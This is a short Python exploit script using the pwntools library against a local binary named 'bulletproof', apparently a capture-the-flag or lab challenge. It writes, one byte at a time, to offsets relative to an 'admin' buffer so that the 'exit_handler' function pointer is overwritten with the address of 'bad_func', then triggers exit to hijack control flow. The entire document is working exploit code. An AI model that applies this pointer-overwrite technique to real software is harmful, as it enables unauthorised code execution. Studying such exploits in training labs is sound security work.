#!/usr/bin/python
from pwn import *

# Helper function to extract one byte from an integer
# ex. extract_byte(0xaabbccdd, 0) => 0xdd
# ex. extract_byte(0xaabbccdd, 2) => 0xbb
def extract_byte(value, pos):
	return (value >> (pos * 8)) % 256

e = ELF("./bulletproof", checksec=False)

bad_func = e.symbols['bad_func']
exit_handler = e.symbols['exit_handler']
admin_name = e.symbols['admin'] + 4

p = process("./bulletproof")

# Overwrite function pointer
p.send('2')
p.sendline("%d %s" % (exit_handler - admin_name, chr(extract_byte(bad_func, 0))))
p.sendline("%d %s" % (exit_handler - admin_name + 1, chr(extract_byte(bad_func, 1))))
p.sendline("%d %s" % (exit_handler - admin_name + 2, chr(extract_byte(bad_func, 2))))
p.sendline("%d %s" % (exit_handler - admin_name + 3, chr(extract_byte(bad_func, 3))))
p.send('3')
print(p.recv())
p.close()
